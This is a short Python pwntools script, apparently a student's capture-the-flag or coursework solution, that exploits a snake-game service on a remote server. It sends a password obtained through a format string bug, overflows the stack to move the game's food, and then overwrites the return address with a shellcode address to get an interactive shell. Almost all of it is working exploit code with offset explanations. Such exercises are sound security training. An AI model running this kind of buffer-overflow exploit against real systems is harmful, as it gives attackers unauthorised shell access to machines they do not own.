from pwn import*


# more detailed description of my method is in the report

# Connect to the server need to be attacked
r = remote('140.113.194.80',20069)  

# Using Format String Vulnerability to get the password , and it is  'SSP_IS_SO_HANDSOME'
r.sendline('SSP_IS_SO_HANDSOME')


#send 64 redundant byte to overflow stack , then the 65th~68th byte (from the begining position of fgets string) is the  Y position of the food , since 65th ~ 67th byte is originally 
# \x00 , so I simply send'\n'(with sendline),which has ascii \x0A to the 68th byte, and this will make the food to move to the central position of the jail.  
r.sendline('0000000000000000000000000000000000000000000000000000000000000000')

# move the snake to eat the food 
r.sendline('dddddddddddd')

#observe the binary, we can find that the fgets starts from -0x48 from ebp, so put 76 redundant byte(72+ 4 (ebp)), then put the address of shell code to the 77~80th byte, which will let the program
#jump to the shell code
r.sendline('0000000000000000000000000000000000000000000000000000000000000000000000000000\xc0\x8d\x04\x08\xc0\x8d\x04\x08')

# use pwn interactive function to make the manipulation of shell much easier
r.interactive()

